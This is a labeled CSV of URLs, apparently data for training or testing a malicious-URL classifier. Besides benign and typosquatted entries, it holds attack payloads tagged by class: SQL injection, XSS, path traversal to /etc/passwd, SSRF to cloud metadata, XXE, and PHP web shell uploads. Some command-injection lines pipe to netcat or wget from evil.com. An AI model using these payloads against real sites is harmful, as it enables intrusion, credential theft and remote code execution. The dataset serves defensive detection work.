url,label
https://www.google.com,benign
https://github.com/user/repo,benign
https://stackoverflow.com/questions/123,benign
https://www.amazon.com/products,benign
https://docs.python.org/3/library/,benign
https://www.wikipedia.org/wiki/Machine_learning,benign
https://www.youtube.com/watch?v=abc123,benign
https://www.linkedin.com/in/profile,benign
https://www.reddit.com/r/programming,benign
https://news.ycombinator.com,benign
https://www.gooogle.com,typosquatting
https://www.payp4l.com,typosquatting
https://www.amazom.com,typosquatting
https://www.micr0soft.com,typosquatting
https://www.fac3book.com,typosquatting
https://example.com/search?q=1%20OR%201=1,sql_injection
https://shop.com/product?id=1%20UNION%20SELECT%20*%20FROM%20users,sql_injection
https://site.com/login?user=admin--,sql_injection
https://web.com/page?id=1%20DROP%20TABLE%20users,sql_injection
https://app.com/search?q=OR%201=1--,sql_injection
https://example.com/search?q=%3Cscript%3Ealert(XSS)%3C/script%3E,xss
https://site.com/comment?text=%3Cimg%20src=x%20onerror=alert(1)%3E,xss
https://web.com/page?name=%3Cscript%3Edocument.cookie%3C/script%3E,xss
https://app.com/profile?bio=%3Csvg%20onload=alert(XSS)%3E,xss
https://forum.com/post?content=javascript:alert(XSS),xss
https://example.com/file?path=../../../etc/passwd,directory_traversal
https://site.com/download?file=....//....//etc/shadow,directory_traversal
https://web.com/view?doc=..\\..\\..\\windows\\system32\\hosts,directory_traversal
https://app.com/read?filename=../../../boot.ini,directory_traversal
https://portal.com/get?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,directory_traversal
https://example.com/ping?host=127.0.0.1;%20cat%20/etc/passwd,command_injection
https://site.com/exec?cmd=ls%20-la%20&&%20whoami,command_injection
https://web.com/run?command=ping%20127.0.0.1%20|%20nc%20evil.com%204444,command_injection
https://app.com/system?cmd=cat%20/etc/passwd,command_injection
https://portal.com/shell?exec=wget%20http://evil.com/shell.php,command_injection
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/,ssrf
https://site.com/proxy?target=http://localhost:22,ssrf
https://web.com/curl?url=file:///etc/passwd,ssrf
https://app.com/request?endpoint=http://127.0.0.1:3306,ssrf
https://portal.com/get?url=gopher://127.0.0.1:11211/_stats,ssrf
https://example.com/page?include=php://filter/read=convert.base64-encode/resource=index.php,lfi_rfi
https://site.com/view?file=data://text/plain;base64;PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+,lfi_rfi
https://web.com/load?page=expect://id,lfi_rfi
https://app.com/include?file=zip://evil.zip%23shell.php,lfi_rfi
https://portal.com/view?doc=compress.zlib://evil.txt,lfi_rfi
https://example.com/login?username=admin&password=admin,brute_force
https://site.com/auth?user=root&passwd=123456,brute_force
https://web.com/signin?email=test@test.com&password=password,brute_force
https://app.com/login?username=administrator&password=password123,brute_force
https://portal.com/auth?user=guest&password=guest,brute_force
https://example.com/search?q=test&q=%3Cscript%3Ealert(1)%3C/script%3E,http_parameter_pollution
https://site.com/form?param=value1&param=value2&param=malicious,http_parameter_pollution
https://web.com/api?id=1&id=2&id=999999,http_parameter_pollution
https://app.com/process?data=normal&data=evil&data=payload,http_parameter_pollution
https://portal.com/submit?field=safe&field=%3Cimg%20src=x%20onerror=alert(1)%3E,http_parameter_pollution
https://example.com/xml?data=%3C!DOCTYPE%20test%20[%3C!ENTITY%20xxe%20SYSTEM%20file:///etc/passwd%3E]%3E%3Ctest%3E&xxe;%3C/test%3E,xxe
https://site.com/parse?xml=%3C?xml%20version=1.0?%3E%3C!DOCTYPE%20root%20[%3C!ENTITY%20test%20SYSTEM%20file:///etc/shadow%3E]%3E%3Croot%3E&test;%3C/root%3E,xxe
https://web.com/process?data=%3C!DOCTYPE%20foo%20[%3C!ELEMENT%20foo%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20file:///etc/hosts%20%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,xxe
https://example.com/upload?file=shell.php&content=%3C?php%20system($_GET[cmd]);%20?%3E,web_shell_upload
https://site.com/fileupload?name=backdoor.php&data=%3C?php%20eval($_POST[code]);%20?%3E,web_shell_upload
https://web.com/upload.php?filename=webshell.php,web_shell_upload
https://app.com/uploader?file=c99.php&type=shell,web_shell_upload
https://portal.com/file_upload?name=r57.php&content=malicious_code,web_shell_upload